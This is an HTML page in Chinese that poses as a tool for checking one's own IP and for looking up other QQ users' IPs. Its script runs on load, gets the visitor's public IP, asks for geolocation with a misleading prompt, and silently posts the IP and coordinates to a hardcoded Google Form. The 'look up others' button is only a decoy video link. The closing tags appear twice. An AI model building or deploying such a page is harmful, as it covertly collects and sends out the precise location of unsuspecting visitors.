<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <title>简单实用地自检查IP和侦测QQIP</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #status { margin-top: 20px; white-space: pre-wrap; }
    button { margin: 5px 0; padding: 8px 12px; font-size: 16px; }
  </style>
</head>
<body>
  <h1>查询QQIP功能加载中，请稍候......</h1>
  <p id="info">=请允许定位权限以确保功能运作正常（这个过程会帮您展示您的IP以确保回答的准确性）</p>

  <button onclick="getIP()">点击仅显示当前公网 IP</button>
  <p id="ipOnlyResult"></p>

  <button onclick="window.open('https://www.bilibili.com/video/BV1GJ411x7h7/?spm_id_from=333.337.search-card.all.click&vd_source=7504f18c191405de66c8b613d77dfea9', '_blank')">
    查询他人QQIP功能
  </button>

  <script>
    const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";

    const entryIP = "entry.349181765";
    const entryLon = "entry.1434358418";
    const entryLat = "entry.99996352";

    async function getIP() {
      const output = document.getElementById('ipOnlyResult');
      output.textContent = "查询中……";
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        output.textContent = "当前公网 IP 是：" + data.ip;
      } catch (e) {
        output.textContent = "获取失败：" + e.message;
      }
    }

    async function fetchIP() {
      try {
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        return data.ip;
      } catch (e) {
        return "获取失败";
      }
    }

    async function fetchCountryFromIP(ip) {
      const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
      const response = await fetch('ip_country_ranges.json');
      const data = await response.json();

      for (const [start, end, country] of data) {
        if (ipNum >= start && ipNum <= end) {
          return country;
        }
      }
      return '未知国家';
    }

    function postToGoogleForm(ip, lon, lat) {
      const formData = new FormData();
      formData.append(entryIP, ip);
      formData.append(entryLon, lon);
      formData.append(entryLat, lat);

      fetch(googleFormURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      }).catch(console.error);
    }

    async function main() {
      const ip = await fetchIP();
      document.getElementById('info').textContent = "IP: " + ip + "，等待定位中...";

      const country = await fetchCountryFromIP(ip);
      document.getElementById('info').textContent += "\n归属国家: " + country;

      if (!navigator.geolocation) {
        document.getElementById('info').textContent += "\n浏览器不支持定位功能";
        postToGoogleForm(ip, "不支持", "不支持");
        return;
      }

      navigator.geolocation.getCurrentPosition(position => {
        const latNum = position.coords.latitude;
        const lonNum = position.coords.longitude;

        const latDir = latNum >= 0 ? 'N' : 'S';
        const lonDir = lonNum >= 0 ? 'E' : 'W';

        const lat = Math.abs(latNum).toFixed(6);
        const lon = Math.abs(lonNum).toFixed(6);

        document.getElementById('info').textContent += `\n经度: ${lon}${lonDir}\n纬度: ${lat}${latDir}`;
        postToGoogleForm(ip, lonNum.toFixed(6), latNum.toFixed(6));
      }, err => {
        document.getElementById('info').textContent += `\n定位失败：${err.message}`;
        postToGoogleForm(ip, "失败", "失败");
      }, {timeout: 15000});
    }

    main();
  </script>
</body>
</html>


    main();
  </script>
</body>
</html>
